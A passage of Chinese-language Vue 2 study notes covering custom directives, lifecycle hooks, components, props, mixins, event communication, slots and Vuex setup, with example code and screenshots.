				console.log(element, binding)
				// console.log('big', this) 
				//注意此处的this是window
				element.innerText = binding.value * 10
			},
			fbind: {
				//指令与元素成功绑定时（一上来）调用
				bind(element, binding) {//两个参数：当前DOM元素（input），本次绑定的所有信息
					element.value = binding.value
				},
				//指令所在元素被插入页面时调用
				inserted(element, binding) {
					element.focus()
					// input输入框自动获取焦点，这句代码必须放在将input放入页面的后面
				},
				//指令所在的模板被重新解析时调用
				update(element, binding) {
					element.value = binding.value
					element.focus()
				}
			}
		}
	})

</script>

</html>
```

## 2.2生命周期

### 2.2.1生命周期介绍

1. 又名：生命周期回调函数、生命周期函数、生命周期钩子。
2. 是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数。
3. 生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。
4. 生命周期函数中的this指向是vm 或 组件实例对象。

### 2.2.2 生命周期函数

1. 初始化显示
   - `beforeCreate()`
   - `created()`
   - `beforeMount()`
   - `mounted()`
2. 更新状态
   - `beforeUpdate()`
   - `updated()`
3. 销毁 vue 实例: `vm.$destory()`
   - `beforeDestory()`
   - `destoryed()`

### 2.2.3 生命周期图详解

![Vue生命周期图](https://zwjimg.oss-cn-beijing.aliyuncs.com/fd987d1498a744e1e2500bbb19c162e9.png)

### 2.2.4 常用的生命周期方法

- `mounted()`: 发送ajax请求, 启动定时器、绑定自定义事件、订阅消息等异步任务【初始化操作】
- `beforeDestroy()`: 做收尾工作, 如: 清除定时器、解绑自定义事件、取消订阅消息等【首尾工作】

### 2.2.5 关于销毁Vue实例

1. 销毁后借助Vue开发者工具看不到任何信息
2. 销毁后自定义事件会失效，但原生DOM事件依然有效
3. 一般不会在`beforeDestroy`操作数据，因为即使操作数据，也不会再触发更新流程了。

## 3.1模块与组件、模块化与组件化

![image.png](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/17cef16fd2f94821b04be2e3e39df2a5~tplv-k3u1fbpfcp-watermark.awebp)

![image.png](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/6f41fc7cd6e54e2fbdbfdc7cae5f525b~tplv-k3u1fbpfcp-watermark.awebp)

![image.png](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9ef15dffda334f058f1821e42acc40a2~tplv-k3u1fbpfcp-watermark.awebp)

### 3.1.1.模块

- 理解：向外提供特定功能的js程序,一般就是一个js文件
- 为什么：js文件很多很复杂
- 作用：复用js,简化js的编写,提高js运行效率

### 3.1.2.组件

1. 理解：用来实现局部(特定)功能效果的代码集合(html/css/js/image…..)
2. 为什么：一个界面的功能很复杂
3. 作用：复用编码,简化项目编码,提高运行效率

### 3.1.3.模块化

当应用中的js都以模块来编写的,那这个应用就是一个模块化的应用。

### 3.1.4.组件化

当应用中的功能都是多组件的方式来编写的,那这个应用就是一个组件化的应用。

## 3.2.非单文件组件

1. 模板编写没有提示
2. 没有构建过程,无法将ES6转换成ES5
3. 不支持组件的CSS
4. 真正开发中几乎不用

### 3.2.1非单文件组件的基本使用

```js
	Vue中使用组件的三大步骤：
		一、定义组件(创建组件)
		二、注册组件
		三、使用组件(写组件标签)

	一、如何定义一个组件？
		使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几
                乎一样，但也有点区别；
			1.el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器
			2.data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。
			备注：使用template可以配置组件结构。

	二、如何注册组件？
		1.局部注册：靠new Vue的时候传入components选项
		2.全局注册：靠Vue.component('组件名',组件)

	三、编写组件标签(来实现组件复用)：
		<school></school> <student></student> <hello></hello>

<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8" />
	<title>基本使用</title>
	<script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
	<!-- 准备好一个容器-->
	<div id="root">
		<hello></hello>
		<hr>
		<h1>{{msg}}</h1>
		<hr>
		<!-- 第三步：编写组件标签 -->
		<school></school>
		<hr>
		<!-- 第三步：编写组件标签 -->
		<student></student>
		<student></student>
	</div>

	<div id="root2">
		<hello></hello>
	</div>
</body>

<script type="text/javascript">
	Vue.config.productionTip = false

	//第一步：创建school组件
	const school1 = Vue.extend({
    // el:'#root', //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。
		template: `
				<div class="demo">
					<h2>学校名称：{{schoolName}}</h2>
					<h2>学校地址：{{address}}</h2>
					<button @click="showName()">点我提示学校名</button>	
				</div>
			`,
		data() {//写成函数
			return {
				schoolName: '尚硅谷',
				address: '北京昌平'
			}
		},
		methods: {
			showName() {
				alert(this.schoolName)
			}
		},
	})

	//第一步：创建student组件
	const student1 = Vue.extend({
		template: `
				<div>
					<h2>学生姓名：{{studentName}}</h2>
					<h2>学生年龄：{{age}}</h2>
				</div>
			`,
		data() {
			return {
				studentName: '张三',
				age: 18
			}
		}
	})

	//第一步：创建hello组件
	const hello1 = Vue.extend({
		template: `
				<div>	
					<h2>你好啊！{{name}}</h2>
				</div>
			`,
		data() {
			return {
				name: 'Tom'
			}
		}
	})

	//第二步：全局注册组件
	Vue.component('hello', hello1)

	//创建vm
	new Vue({
		el: '#root',
		data: {
			msg: '你好啊！'
		},
		//第二步：注册组件（局部注册）
		components: {
			school: school1,
			student: student1
			// 组件名：中转变量，如果组件名和中转变量一致如school:school则可以写为school
		}
	})

	new Vue({
		el: '#root2',
	})
</script>
</html>

```

![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/67bc5c9cfde24081ba3d9104982bf4d6~tplv-k3u1fbpfcp-watermark.awebp)

### 3.2.2组件的几个注意点

```js
几个注意点：
	1.关于组件名:
		一个单词组成：
			第一种写法(首字母小写)：school
			第二种写法(首字母大写)：School
		多个单词组成：
			第一种写法(kebab-case命名)："my-school"
			第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)
	备注：
		(1).组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。
		(2).可以使用name配置项指定组件在开发者工具中呈现的名字。
	2.关于组件标签:
		第一种写法：<school></school>
		第二种写法：<school/>
		备注：不用使用脚手架时，<school/>会导致后续组件不能渲染。
        3.一个简写方式：
		const school = Vue.extend(options) 可简写为：const school = options

<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8" />
	<title>几个注意点</title>
	<script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
	<!-- 准备好一个容器-->
	<div id="root">
		<school></school>
	</div>
</body>
<script type="text/javascript">
	Vue.config.productionTip = false

	//定义组件
	const s = {
		name: 'atguigu',
		template: `
				<div>
					<h2>学校名称：{{name}}</h2>	
					<h2>学校地址：{{address}}</h2>	
				</div>
			`,
		data() {
			return {
				name: '尚硅谷',
				address: '北京'
			}
		}
	}
	new Vue({
		el: '#root',
		components: {
			"school": s
		}
	})
</script>
</html>

```

### 3.2.3组件的嵌套

**子组件要在父组件之前定义**

```js
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8" />
	<title>组件的嵌套</title>
	<!-- 引入Vue -->
	<script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
	<!-- 准备好一个容器-->
	<div id="root">

	</div>
</body>
<script type="text/javascript">
	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
	//定义student组件
	const student = Vue.extend({
		name: 'student',
		template: `
				<div>
					<h2>学生姓名：{{name}}</h2>	
					<h2>学生年龄：{{age}}</h2>	
				</div>
			`,
		data() {
			return {
				name: 'pink老师',
				age: 18
			}
		}
	})
	//定义school组件
	const school = Vue.extend({
		name: 'school',
		template: `
				<div>
					<h2>学校名称：{{name}}</h2>	
					<h2>学校地址：{{address}}</h2>	
					<student></student>
				</div>
			`,
		data() {
			return {
				name: '尚硅谷',
				address: '北京'
			}
		},
		//注册组件（局部）
		components: {
			student
		}
	})

	//定义hello组件
	const hello = Vue.extend({
		template: `<h1>{{msg}}</h1>`,
		data() {
			return {
				msg: '欢迎来到尚硅谷学习！'
			}
		}
	})

	//定义app组件
	const app = Vue.extend({
		template: `
				<div>	
					<hello></hello>
					<school></school>
				</div>
			`,
		components: {
			school,
			hello
		}
	})

	//创建vm
	new Vue({
		template: '<app></app>',
		el: '#root',
		//注册组件（局部）
		components: { app }
	})
</script>
</html>

```

![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f71c8b54a5664ea585152dc0ff69c53f~tplv-k3u1fbpfcp-watermark.awebp)

### 3.2.4 VueComponent

```js
关于VueComponent：
   1.school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。

   2.我们只需要写<school/>或<school></school>，Vue解析时会帮我们创建school组件的实例对象，
	  即Vue帮我们执行的：new VueComponent(options)。

   3.特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！

   4.关于this指向：
	(1).组件配置中：
	  data函数、methods中的函数、watch中的函数、computed中的函数 ，它们的this均是【VueComponent实例对象】。
	(2).new Vue(options)配置中：
	  data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。

   5.VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。
    Vue的实例对象，以后简称vm。vm管理着vc

```

如图所示：打印出vm，展开，$children中包含着两个vc ![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/4c4f7a039a4a4d47acad6d410a111571~tplv-k3u1fbpfcp-watermark.awebp)

![image.png](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/31dc487584ee4194833ef0dab30c8b94~tplv-k3u1fbpfcp-watermark.awebp)

```js
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8" />
	<title>VueComponent</title>
	<script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
	<!-- 准备好一个容器-->
	<div id="root">
		<school></school>
		<hello></hello>
	</div>
</body>

<script type="text/javascript">
	Vue.config.productionTip = false

	//定义school组件
	const school = Vue.extend({
		name: 'school',
		template: `
				<div>
					<h2>学校名称：{{name}}</h2>	
					<h2>学校地址：{{address}}</h2>	
					<button @click="showName()">点我提示学校名</button>
				</div>
			`,
		data() {
			return {
				name: '尚硅谷',
				address: '北京'
			}
		},
		methods: {
			showName() {
				console.log('showName:', this)
			}
		},
	})

	const test = Vue.extend({
		template: `<span>atguigu</span>`
	})

	//定义hello组件
	const hello = Vue.extend({
		template: `
				<div>
					<h2>{{msg}}</h2>
					<test></test>	
				</div>
			`,
		data() {
			return {
				msg: '你好啊！'
			}
		},
		components: { test }
	})
	// console.log('@',school)
	// console.log('#',hello)

	//创建vm
	const vm = new Vue({
		el: '#root',
		components: { school, hello }
	})
	console.log(vm);
</script>

</html>

```

### 3.2.5 一个重要的内置关系

```js
	1.一个重要的内置关系：VueComponent.prototype.__proto__ === Vue.prototype
	2.为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。

```

![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0c436e9b07b74ec38f82431c908d994a~tplv-k3u1fbpfcp-watermark.awebp)

```js
Vue构造函数:
Vue构造函数的prototype是Vue的原型对象

vm（Vue构造函数构造的实例对象）：
vm对象的原型等于其构造函数的prototype，即是Vue的prototype,即指向Vue的原型对象：vm.__proto__===Vue.prototype

Vue的原型对象的原型：
即Vue.prototype.__proto__等于其构造函数的prototype：Vue.prototype.__proto__===Object.prototype

VueComponent构造函数：
VueComponent构造函数的prototype是VueComponent的原型对象

vc（VueComponent构造函数构造的实例对象）：
vc对象的原型等于其构造函数的prototype，即是VueComponent的prototype,即指向VueComponent的原型对象：

最后，强行改变VueComponent原型对象的.__proto__指向，让其指向从Object原型对象到Vue的原型对象
VueComponent.prototype.__proto__ === Vue.prototype

<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8" />
	<title>一个重要的内置关系</title>
	<!-- 引入Vue -->
	<script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
	<!-- 准备好一个容器-->
	<div id="root">
		<school></school>
	</div>
</body>

<script type="text/javascript">
	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
	Vue.prototype.x = 99

	//定义school组件
	const school = Vue.extend({
		name: 'school',
		template: `
				<div>
					<h2>学校名称：{{name}}</h2>	
					<h2>学校地址：{{address}}</h2>	
					<button @click="showX">点我输出x</button>
				</div>
			`,
		data() {
			return {
				name: '尚硅谷',
				address: '北京'
			}
		},
		methods: {
			showX() {
				console.log(this.x)
			}
		},
	})

	console.log(school.prototype.__proto__ === Vue.prototype)
	console.dir(school)
	

	//创建一个vm
	const vm = new Vue({
		el: '#root',
		data: {
			msg: '你好'
		},
		components: { school }
	})

	//定义一个构造函数
	/*	function Demo() {
			this.a = 1
			this.b = 2
		}
		//创建一个Demo的实例对象
		const d = new Demo()

		console.log(Demo.prototype) //显示原型属性,只有函数拥有
		// 这两个原型属性的地址都指向原型对象
		console.log(d.__proto__) //隐式原型属性，对象拥有

		console.log(Demo.prototype === d.__proto__)

		//程序员通过显示原型属性操作原型对象，追加一个x属性，值为99
		Demo.prototype.x = 99
		// 顺着这条线放东西
		console.log("输出:", d.__proto__.x)
		// 顺着这条线取东西

		console.log('@', d)
	*/
</script>

</html>

```

## 3.3单文件组件

**大体结构是这样的：**
 ![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f2207765468144eab99618689c9f987c~tplv-k3u1fbpfcp-watermark.awebp)

**<v 加enter能够快速生成模板**

### 3.3.1其余文件(这些文件内创建组件)

#### School.vue文件

```js
<template>
    <!-- 必须有一个根标签 -->
  <div class="demo">
    <h2>学校名称：{{ name }}</h2>
    <h2>学校地址：{{ address }}</h2>
    <button @click="showName">点我提示学校名</button>
  </div>
</template>
//  <v 加enter能够快速生成模板
<script>
	 export default Vue.extend({ //可省略Vue.extend（）
		name:'School',//定义Chrome工具栏Vue工具组件名称
		data(){
			return {
				name:'尚硅谷',
				address:'北京昌平'
			}
		},
		methods: {
			showName(){
				alert(this.name)
			}
		},
	})
</script>

<style>
	.demo{
		background-color: orange;
	}
</style>

```

#### Student.vue文件

```js
<template>
	<div>
		<h2>学生姓名：{{name}}</h2>
		<h2>学生年龄：{{age}}</h2>
	</div>
</template>

<script>
	 export default {
		name:'Student',
		data(){
			return {
				name:'张三',
				age:18
			}
		}
	}
</script>


```

### 3.3.2 App.vue文件

```js
// 创建一个App.vue文件汇总其余组件，将其余vue中创建的组件注册并且编写组件标签
<template>
  <div>
    <School></School>
    <Student></Student>
    <!-- 编写组件标签 -->
  </div>
</template>
<script>
//引入组件
import School from "./School.vue";
import Student from "./Student.vue";
export default {
  name: "App",
  components: {
    //注册组件
    School,
    Student,
  },
};
</script>
<style>
</style>

```

### 3.3.3 main.js文件

```js
import App from './App.vue'
// 在main.js文件中创建vue实例vm，并引入最高级的App.vue文件
new Vue({
	el: '#root',
	template: `<App></App>`,
	components: { App },
})

```

### 3.3.4 index.html文件，准备一个容器

```js
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8" />
	<title>练习一下单文件组件的语法</title>
</head>
<body>
	<!-- 准备一个容器 -->
	<div id="root"></div>
        //引入script标签在body的最下方，并且优先引入Vue
	<script type="text/javascript" src="../js/vue.js"></script>
	<script type="text/javascript" src="./main.js"></script>
</body>
</html>
```

## 4.1 脚手架

### 4.1.1 脚手架文件结构

```
├── node_modules 
├── public
│   ├── favicon.ico: 页签图标
│   └── index.html: 主页面
├── src
│   ├── assets: 存放静态资源
│   │   └── logo.png
│   │── component: 存放组件
│   │   └── HelloWorld.vue
│   │── App.vue: 汇总所有组件
│   │── main.js: 入口文件
├── .gitignore: git版本管制忽略的配置
├── babel.config.js: babel的配置文件
├── package.json: 应用包配置文件 
├── README.md: 应用描述文件
├── package-lock.json：包版本控制文件
```

### 4.1.2 关于不同版本的Vue

1. vue.js与vue.runtime.xxx.js的区别：
   1. vue.js是完整版的Vue，包含：核心功能 + 模板解析器。
   2. vue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器。
2. 因为vue.runtime.xxx.js没有模板解析器，所以不能使用template这个配置项，需要使用render函数接收到的createElement函数去指定具体内容。

### 4.1.3 vue.config.js配置文件

1. 使用vue inspect > output.js可以查看到Vue脚手架的默认配置。
2. 使用vue.config.js可以对脚手架进行个性化定制，详情见：https://cli.vuejs.org/zh

### 4.1.4 ref属性

1. 被用来给元素或子组件注册引用信息（id的替代者）
2. 应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc）
3. 使用方式：
   1. 打标识：`<h1 ref="xxx">.....</h1>` 或 `<School ref="xxx"></School>`
   2. 获取：`this.$refs.xxx`

### 4.1.7 props配置项

1. 功能：让组件接收外部传过来的数据

2. 传递数据：`<Demo name="xxx"/>`

3. 接收数据：

   1. 第一种方式（只接收）：`props:['name']`

   2. 第二种方式（限制类型）：`props:{name:String}`

   3. 第三种方式（限制类型、限制必要性、指定默认值）：

      ```
      props:{
      	name:{
      	type:String, //类型
      	required:true, //必要性
      	default:'老王' //默认值
      	}
      }
      ```

   > 备注：props是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据。

### 4.1.6 mixin(混入)

1. 功能：可以把多个组件共用的配置提取成一个混入对象

2. 使用方式：

   第一步定义混合：

   ```
   {
       data(){....},
       methods:{....}
       ....
   }
   ```

   第二步使用混入：

    全局混入：`Vue.mixin(xxx)` 局部混入：`mixins:['xxx']`

## 4.2 父子组件通信

### 4.2.1 绑定事件

#### 方式一:通过props回调

步骤一:父组件定义一个函数,用于给子组件进行回调

![image-20220104225614920](https://zwjimg.oss-cn-beijing.aliyuncs.com/image-20220104225614920.png)

步骤二:子组件通过props接受到函数的传递,并进行调用

![image-20220104225736198](https://zwjimg.oss-cn-beijing.aliyuncs.com/image-20220104225736198.png)

代码实现

```vue
<template>
  <div>
    <img src="./assets/logo.png" alt="logo">
    <School :getSchoolName="getSchoolName" @atguigu="test"></School>
  </div>
</template>

<script>
//引入组件
import School from "@/components/School";

export default {
  name: "App",
  components: {
    School
  },
  methods:{
    getSchoolName(name){
      console.log('app收到了学校名',name)
    },
    test(name){
      console.log('触发了atguigu事件,参数是',name)
    }
  }
}
</script>

<style scoped>

</style>
```

#### 方式二:通过组件的自定义事件

步骤一:父组件通过v-on或者@进行绑定自定义事件

双引号里面写的是子组件调用自定义事件后回调的函数

![image-20220104225912414](https://zwjimg.oss-cn-beijing.aliyuncs.com/image-20220104225912414.png)

步骤二:子组件通过this拿到当前的vueCommponent实例对象,进行调用$emit函数

进行事件的触发,同时可以进行参数的传递,可以传递多个参数

多个参数可以写成一个对象,或者可变长度的数组的形式

![image-20220104230048805](https://zwjimg.oss-cn-beijing.aliyuncs.com/image-20220104230048805.png)

#### 方式三:在父组件通过ref获取实例对象绑定

##### 永久绑定

在父组件给子组件定义ref属性

通过this.$refs.ref名.$on()进行绑定事件

![image-20220104232711701](https://zwjimg.oss-cn-beijing.aliyuncs.com/image-20220104232711701.png)

##### 一次性绑定

把on改为once即可

![image-20220104232944497](https://zwjimg.oss-cn-beijing.aliyuncs.com/image-20220104232944497.png)

效果截图

![image-20220104232822747](https://zwjimg.oss-cn-beijing.aliyuncs.com/image-20220104232822747.png)

### 4.2.2 解绑事件

#### 普通解绑

调用子组件this vc实例对象里的$off方式解绑事件

![image-20220104233933962](https://zwjimg.oss-cn-beijing.aliyuncs.com/image-20220104233933962.png)

#### 暴力解绑

销毁vm会自动解绑事件

调用子组件或者vm的onDestroy方法

#### 总结

##### this指向问题

如果通过ref绑定的事件,可以写成回调函数的方式

如果写成普通函数,this指向是子组件的实例对象,因为这个回调函数是子组件触发事件的时候调用的

![image-20220105210054213](https://zwjimg.oss-cn-beijing.aliyuncs.com/image-20220105210054213.png)

正确写法可以把方法写在methods里或者把回调函数写成箭头函数,箭头函数本身是没有this的,回往外层找this,就找到了mounted函数里的this,也就是app组件的this

![image-20220105210314630](https://zwjimg.oss-cn-beijing.aliyuncs.com/image-20220105210314630.png)

##### 组件绑定点击事件

如果直接在子组件的标签上写@click事件,vue会认为是自定义事件,必须加一个修饰符native,不然没办法生效

![image-20220105210731853](https://zwjimg.oss-cn-beijing.aliyuncs.com/image-20220105210731853.png)

### 4.2.3 全局事件总线

#### 1.安装全局事件总线

在main.js里的beforeCreate()方法里面注册

![image-20220109183428948](https://zwjimg.oss-cn-beijing.aliyuncs.com/image-20220109183428948.png)

#### 2.创建事件并绑定回调事件

![image-20220109183509695](https://zwjimg.oss-cn-beijing.aliyuncs.com/image-20220109183509695.png)

#### 3.发送数据

![image-20220109183525322](https://zwjimg.oss-cn-beijing.aliyuncs.com/image-20220109183525322.png)

## 4.2.4 网络请求

### axios

![image-20220109230941867](https://zwjimg.oss-cn-beijing.aliyuncs.com/image-20220109230941867.png)

## 4.3 插槽

### 默认插槽

子组件定义一个插槽

![image-20220110183520153](https://zwjimg.oss-cn-beijing.aliyuncs.com/image-20220110183520153.png)

父组件使用标签填充插槽

![image-20220110183630111](https://zwjimg.oss-cn-beijing.aliyuncs.com/image-20220110183630111.png)

### 具名插槽

定义具名插槽

![image-20220110184528309](https://zwjimg.oss-cn-beijing.aliyuncs.com/image-20220110184528309.png)

使用具名插槽

![image-20220110184549149](https://zwjimg.oss-cn-beijing.aliyuncs.com/image-20220110184549149.png)

### 作用域插槽

定义插槽并给插槽使用者传递数据

![image-20220110190135862](https://zwjimg.oss-cn-beijing.aliyuncs.com/image-20220110190135862.png)

插槽使用者拿到数据,并使用数据

解构赋值就可以直接拿到对应的数据,而不是一个对象

![image-20220110190242929](https://zwjimg.oss-cn-beijing.aliyuncs.com/image-20220110190242929.png)

## 5.1 Vuex

### 定义

![image-20220110190449123](https://zwjimg.oss-cn-beijing.aliyuncs.com/image-20220110190449123.png)

### 搭建Vuex环境

#### 安装Vuex

```shell
npm i Vuex
```

#### 创建Store

并在Store里引入Vuex和Vue

并使用Vuex插件,创建对应的actions mutations state对象

最后暴露出去

![image-20220110202312782](https://zwjimg.oss-cn-beijing.aliyuncs.com/image-20220110202312782.png)

#### 使用Store

![image-20220110202448945](https://zwjimg.oss-cn-beijing.aliyuncs.com/image-20220110202448945.png)
